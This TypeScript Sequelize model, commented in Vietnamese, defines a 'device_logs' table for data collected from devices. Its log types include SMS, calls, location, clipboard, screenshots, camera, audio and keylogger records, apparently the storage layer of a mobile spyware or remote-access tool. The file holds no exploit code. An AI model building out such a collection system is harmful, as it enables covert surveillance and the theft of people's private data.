// DeviceLog Model - Lưu dữ liệu thu thập từ thiết bị (contacts, sms, files, etc.)
import { Table, Column, Model, DataType, PrimaryKey, Default, AllowNull, ForeignKey, BelongsTo } from 'sequelize-typescript';
import { Optional } from 'sequelize';
import { Device } from './Device';

// Log types
export enum LogType {
  CONTACTS = 'contacts',
  SMS = 'sms',
  CALLS = 'calls',
  LOCATION = 'location',
  CLIPBOARD = 'clipboard',
  SCREENSHOT = 'screenshot',
  CAMERA = 'camera',
  AUDIO = 'audio',
  GALLERY = 'gallery',
  KEYLOGGER = 'keylogger',
  APPS = 'apps',
  FILE = 'file',
  MESSAGE = 'message',
  OTHER = 'other'
}

export interface DeviceLogAttributes {
  id: number;
  device_id: number;
  type: LogType;
  payload: any; // JSON data
  file_path?: string | null;
  created_at: Date;
}

export interface DeviceLogCreationAttributes extends Optional<DeviceLogAttributes, 'id' | 'created_at' | 'file_path'> {}

@Table({
  tableName: 'device_logs',
  timestamps: false,
  createdAt: 'created_at',
  updatedAt: false,
})
export class DeviceLog extends Model<DeviceLogAttributes, DeviceLogCreationAttributes> {
  @PrimaryKey
  @Default(DataType.UUIDV4)
  @Column(DataType.UUID)
  id!: number;

  @ForeignKey(() => Device)
  @AllowNull(false)
  @Column(DataType.UUID)
  device_id!: number;

  @BelongsTo(() => Device)
  device?: Device;

  @AllowNull(false)
  @Column(DataType.ENUM(...Object.values(LogType)))
  type!: LogType;

  @AllowNull(false)
  @Column(DataType.JSON)
  payload!: any;

  @Column(DataType.STRING(500))
  file_path?: string | null;

  @Default(DataType.NOW)
  @Column(DataType.DATE)
  created_at!: Date;
}

export default DeviceLog;
